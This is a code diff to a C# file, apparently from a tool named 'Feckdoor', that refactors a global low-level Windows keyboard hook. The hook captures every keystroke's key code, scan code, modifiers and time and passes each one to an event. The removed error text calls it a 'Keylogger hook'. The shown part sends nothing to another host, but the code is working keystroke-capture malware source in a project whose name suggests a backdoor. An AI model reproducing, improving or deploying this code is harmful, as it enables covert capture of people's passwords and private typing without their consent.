@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using Serilog;
+using System.Diagnostics;
 
 namespace Feckdoor.InputLog
 {
@@ -9,14 +10,22 @@ namespace Feckdoor.InputLog
 			get; private set;
 		} = IntPtr.Zero;
 
-		public static event EventHandler<KeyboardInputEventArgs> OnKeyboardInput = null!;
+		public static event EventHandler<KeyboardInputEventArgs>? OnKeyboardInput;
+
+		/// <summary>
+		/// To prevent callback from being garbage collected
+		/// </summary>
+
+		private readonly static User32.LowLevelKeyboardProc MyCallback = KeyboardHookProc;
 
 		public static void InstallHook()
 		{
-			using Process process = Process.GetCurrentProcess();
+			using var process = Process.GetCurrentProcess();
 			using ProcessModule? module = process.MainModule;
 			if (module != null)
-				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, KeyboardHookProc, module.BaseAddress, 0);
+				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, MyCallback, module.BaseAddress, 0);
+			else
+				Log.Warning("Hook not installed: Main module of current process unavailable.");
 		}
 
 		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
@@ -25,22 +34,15 @@ namespace Feckdoor.InputLog
 			{
 				try
 				{
-					uint vkCode = lParam.vkCode;
-					KeyboardModifierKey modifier = 0;
+					ModifierKey modifier = MkHelper.GetActiveModifierKeys();
 					if (lParam.flags.HasFlag(User32.LLKHF.ALTDOWN))
-						modifier |= KeyboardModifierKey.Alt;
-					if (ModifierVkCode.CtrlKey.AnyVkMatch())
-						modifier |= KeyboardModifierKey.Ctrl;
-					if (ModifierVkCode.ShiftKey.AnyVkMatch())
-						modifier |= KeyboardModifierKey.Shift;
-					if (ModifierVkCode.WinKey.AnyVkMatch())
-						modifier |= KeyboardModifierKey.Win;
+						modifier |= ModifierKey.Alt;
 
-					OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs((VkCode)vkCode, lParam.scanCode, modifier, lParam.time));
+					OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs(lParam.vkCode, lParam.scanCode, modifier, lParam.time));
 				}
 				catch (Exception e)
 				{
-					File.AppendAllText(Config.TheConfig.ProgramLogFile, $"Keylogger hook error: {e}{Environment.NewLine}");
+					Log.Fatal(e, "Exception on keyboard hook event.");
 				}
 			}
 
@@ -56,31 +58,36 @@ namespace Feckdoor.InputLog
 
 	public class KeyboardInputEventArgs : EventArgs
 	{
-		public VkCode VkCode
+		public uint VkCode
 		{
-			get; set;
+			get;
+		}
+
+		public VirtualKey VkCodeEnum
+		{
+			get => (VirtualKey)VkCode;
 		}
 
 		public uint ScanCode
 		{
-			get; set;
+			get;
 		}
 
-		public KeyboardModifierKey ModifierKeys
+		public ModifierKey Modifier
 		{
-			get; set;
+			get;
 		}
 
 		public uint Time
 		{
-			get; set;
+			get;
 		}
 
-		public KeyboardInputEventArgs(VkCode vkCode, uint scanCode, KeyboardModifierKey modifiers, uint time)
+		public KeyboardInputEventArgs(uint vkCode, uint scanCode, ModifierKey modifiers, uint time)
 		{
 			this.VkCode = vkCode;
 			ScanCode = scanCode;
-			ModifierKeys = modifiers;
+			Modifier = modifiers;
 			Time = time;
 		}
 	}
